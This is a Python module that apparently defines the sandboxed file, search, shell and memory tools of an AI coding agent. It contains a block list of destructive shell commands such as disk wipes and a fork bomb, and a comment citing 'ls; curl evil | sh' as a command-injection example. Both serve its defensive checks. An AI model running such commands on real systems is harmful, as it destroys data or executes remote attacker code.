"""Tool definitions and execution.

Every tool is sandboxed to ``AGENT_WORKSPACE``: paths are resolved and rejected
when they escape the root (including through symlinks). ``run_shell`` is opt-out
(``AGENT_SHELL_ENABLED=false``) and can be restricted to an allow-list of
executables with ``AGENT_SHELL_ALLOW=git,python3,ls``.

The guard-rails here are *not* a security boundary against a hostile model —
run the agent as an unprivileged user in a container if you need that.
"""

from __future__ import annotations

import json
import os
import shlex
import subprocess
from pathlib import Path
from typing import Any

from .config import Config
from .memory import MemoryStore

MAX_READ_BYTES = 200_000
MAX_SEARCH_HITS = 200
DANGEROUS_PATTERNS = (
    "rm -rf /",
    "rm -rf /*",
    "mkfs",
    "dd if=/dev/zero of=/dev/",
    ":(){",
    "chmod -R 777 /",
    "shutdown",
    "reboot",
    "> /dev/sda",
)


class ToolError(RuntimeError):
    """Raised when a tool call is invalid or refused."""


TOOL_SCHEMAS: list[dict[str, Any]] = [
    {
        "type": "function",
        "function": {
            "name": "list_dir",
            "description": "List files and directories at a path relative to the workspace root.",
            "parameters": {
                "type": "object",
                "properties": {
                    "path": {"type": "string", "description": "Relative path, defaults to '.'"},
                    "recursive": {"type": "boolean", "default": False},
                },
                "required": [],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "read_file",
            "description": "Read a UTF-8 text file from the workspace.",
            "parameters": {
                "type": "object",
                "properties": {
                    "path": {"type": "string"},
                    "offset": {"type": "integer", "minimum": 0, "default": 0},
                    "limit": {"type": "integer", "minimum": 1, "default": 400},
                },
                "required": ["path"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "write_file",
            "description": (
                "Write full UTF-8 contents to a file in the workspace, creating parent "
                "directories. Overwrites the file, so always read it first."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "path": {"type": "string"},
                    "content": {"type": "string"},
                },
                "required": ["path", "content"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "search_text",
            "description": "Recursive plain-text/regex search in the workspace (grep -rn).",
            "parameters": {
                "type": "object",
                "properties": {
                    "pattern": {"type": "string"},
                    "path": {"type": "string", "default": "."},
                    "max_results": {"type": "integer", "minimum": 1, "default": 50},
                },
                "required": ["pattern"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "run_shell",
            "description": (
                "Run a shell command inside the workspace and return stdout/stderr/exit code. "
                "Prefer read_file/search_text when you only need to look at something."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "command": {"type": "string"},
                    "timeout": {"type": "integer", "minimum": 1, "default": 60},
                },
                "required": ["command"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "memory_save",
            "description": (
                "Persist a durable fact about the user, the project or the environment. "
                "Reusing an existing name updates that memory instead of duplicating it."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "name": {"type": "string", "description": "short-kebab-case-id"},
                    "content": {"type": "string", "description": "Markdown body"},
                    "type": {"type": "string", "enum": ["user", "feedback", "project", "reference"]},
                    "description": {"type": "string", "description": "One line summary"},
                },
                "required": ["name", "content"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "memory_list",
            "description": "List stored memories with their descriptions.",
            "parameters": {"type": "object", "properties": {}, "required": []},
        },
    },
]


def _resolve(cfg: Config, rel_path: str) -> Path:
    """Resolve ``rel_path`` inside the workspace or refuse."""
    root = cfg.workspace.resolve()
    candidate = (root / (rel_path or ".")).expanduser()
    try:
        resolved = candidate.resolve()
    except OSError as exc:  # pragma: no cover - exotic filesystem errors
        raise ToolError(f"cannot resolve {rel_path!r}: {exc}") from exc
    if resolved != root and root not in resolved.parents:
        raise ToolError(f"path escapes the workspace root: {rel_path!r}")
    return resolved


def _truncate(text: str, limit: int, label: str = "output") -> str:
    if len(text) <= limit:
        return text
    return f"{text[:limit]}\n... [{label} truncated, {len(text)} chars total]"


def _tool_list_dir(cfg: Config, args: dict[str, Any]) -> str:
    target = _resolve(cfg, args.get("path") or ".")
    if not target.is_dir():
        raise ToolError(f"not a directory: {args.get('path')!r}")
    recursive = bool(args.get("recursive"))
    lines: list[str] = []
    entries = target.rglob("*") if recursive else target.iterdir()
    for entry in entries:
        try:
            rel = entry.relative_to(cfg.workspace.resolve())
        except ValueError:
            continue
        suffix = "/" if entry.is_dir() else f" ({entry.stat().st_size} B)"
        lines.append(f"{rel}{suffix}")
        if len(lines) >= 500:
            lines.append("... (listing truncated at 500 entries)")
            break
    return "\n".join(lines) or "(empty)"


def _tool_read_file(cfg: Config, args: dict[str, Any]) -> str:
    target = _resolve(cfg, args.get("path") or "")
    if not target.is_file():
        raise ToolError(f"no such file: {args.get('path')!r}")
    size = target.stat().st_size
    if size > MAX_READ_BYTES:
        raise ToolError(f"file too large ({size} B > {MAX_READ_BYTES} B): use search_text")
    offset = max(0, int(args.get("offset") or 0))
    limit = max(1, int(args.get("limit") or 400))
    lines = target.read_text(encoding="utf-8", errors="replace").splitlines()
    chunk = lines[offset : offset + limit]
    return "\n".join(chunk) if chunk else "(no content in that range)"


def _tool_write_file(cfg: Config, args: dict[str, Any]) -> str:
    target = _resolve(cfg, args.get("path") or "")
    content = args.get("content")
    if not isinstance(content, str):
        raise ToolError("content must be a string")
    target.parent.mkdir(parents=True, exist_ok=True)
    target.write_text(content, encoding="utf-8")
    return f"wrote {len(content)} chars to {target.relative_to(cfg.workspace.resolve())}"


def _tool_search_text(cfg: Config, args: dict[str, Any]) -> str:
    pattern = (args.get("pattern") or "").strip()
    if not pattern:
        raise ToolError("pattern must not be empty")
    target = _resolve(cfg, args.get("path") or ".")
    max_results = max(1, min(int(args.get("max_results") or 50), MAX_SEARCH_HITS))
    command = [
        "grep",
        "-rnI",
        "--exclude-dir=.git",
        "--exclude-dir=node_modules",
        "--exclude-dir=var",
        "-e",
        pattern,
        str(target),
    ]
    try:
        proc = subprocess.run(
            command, capture_output=True, text=True, timeout=cfg.shell_timeout, cwd=cfg.workspace
        )
    except FileNotFoundError as exc:
        raise ToolError("grep is not available on this host") from exc
    except subprocess.TimeoutExpired as exc:
        raise ToolError(f"search timed out after {cfg.shell_timeout}s") from exc
    if proc.returncode not in (0, 1):
        raise ToolError(f"grep failed: {proc.stderr.strip()[:400]}")
    hits = [line for line in proc.stdout.splitlines() if line][:max_results]
    if not hits:
        return "(no match)"
    return _truncate("\n".join(hits), cfg.max_tool_chars, "search")


def _tool_run_shell(cfg: Config, args: dict[str, Any]) -> str:
    if not cfg.shell_enabled:
        raise ToolError("run_shell is disabled (AGENT_SHELL_ENABLED=false)")
    command = (args.get("command") or "").strip()
    if not command:
        raise ToolError("command must not be empty")
    lowered = command.lower()
    for pattern in DANGEROUS_PATTERNS:
        if pattern in lowered:
            raise ToolError(f"refused: command contains a destructive pattern ({pattern!r})")
    argv: list[str] | None = None
    if cfg.shell_allow:
        # With an allow-list we exec directly (shell=False) and refuse any
        # metacharacter: otherwise `ls; curl evil | sh` would sail through.
        for meta in (";", "|", "&", "`", "$", "\n", ">", "<"):
            if meta in command:
                raise ToolError(
                    f"refused: shell metacharacter {meta!r} is not allowed when "
                    "AGENT_SHELL_ALLOW is set"
                )
        try:
            argv = shlex.split(command)
        except ValueError as exc:
            raise ToolError(f"cannot parse command: {exc}") from exc
        executable = argv[0] if argv else ""
        if executable not in cfg.shell_allow:
            raise ToolError(
                f"refused: {executable!r} is not in the allow-list "
                f"({', '.join(cfg.shell_allow)})"
            )
    timeout = max(1, min(int(args.get("timeout") or cfg.shell_timeout), cfg.shell_timeout))
    env = {
        "PATH": os.environ.get("PATH", "/usr/local/bin:/usr/bin:/bin"),
        "HOME": str(cfg.workspace),
        "LANG": "C.UTF-8",
        "TERM": "dumb",
    }
    try:
        proc = subprocess.run(
            argv if argv is not None else command,
            shell=argv is None,
            cwd=cfg.workspace,
            capture_output=True,
            text=True,
            timeout=timeout,
            env=env,
        )
    except subprocess.TimeoutExpired:
        return f"error: command timed out after {timeout}s"
    output = []
    if proc.stdout:
        output.append(proc.stdout.rstrip())
    if proc.stderr:
        output.append(f"[stderr]\n{proc.stderr.rstrip()}")
    output.append(f"[exit {proc.returncode}]")
    return _truncate("\n".join(output), cfg.max_tool_chars, "command output")


def _tool_memory_save(cfg: Config, args: dict[str, Any]) -> str:
    store = MemoryStore(cfg.memory_dir)
    memory = store.save(
        name=str(args.get("name") or ""),
        content=str(args.get("content") or ""),
        mem_type=str(args.get("type") or "reference"),
        description=str(args.get("description") or ""),
    )
    return f"saved memory {memory.name!r} ({memory.type})"


def _tool_memory_list(cfg: Config, args: dict[str, Any]) -> str:
    memories = MemoryStore(cfg.memory_dir).all()
    if not memories:
        return "(no memories yet)"
    return "\n".join(f"- {m.name} ({m.type}): {m.description}" for m in memories)


_HANDLERS = {
    "list_dir": _tool_list_dir,
    "read_file": _tool_read_file,
    "write_file": _tool_write_file,
    "search_text": _tool_search_text,
    "run_shell": _tool_run_shell,
    "memory_save": _tool_memory_save,
    "memory_list": _tool_memory_list,
}

TOOL_NAMES = tuple(_HANDLERS)


def execute(cfg: Config, name: str, raw_args: str | dict[str, Any]) -> str:
    """Run a tool by name and return its textual result.

    Errors are returned as strings (prefixed with ``error:``) instead of being
    raised, so the model can read the failure and retry — the classic agent
    loop contract.
    """
    handler = _HANDLERS.get(name)
    if handler is None:
        return f"error: unknown tool {name!r} (available: {', '.join(TOOL_NAMES)})"
    if isinstance(raw_args, str):
        try:
            args = json.loads(raw_args) if raw_args.strip() else {}
        except json.JSONDecodeError as exc:
            return f"error: invalid JSON arguments for {name}: {exc}"
    elif isinstance(raw_args, dict):
        args = raw_args
    else:
        return f"error: arguments for {name} must be a JSON object"
    if not isinstance(args, dict):
        return f"error: arguments for {name} must be a JSON object"
    try:
        return _truncate(handler(cfg, args), cfg.max_tool_chars, "tool output")
    except ToolError as exc:
        return f"error: {exc}"
    except OSError as exc:
        return f"error: {exc}"
    except Exception as exc:  # noqa: BLE001 - a tool must never break the loop
        return f"error: {type(exc).__name__}: {exc}"
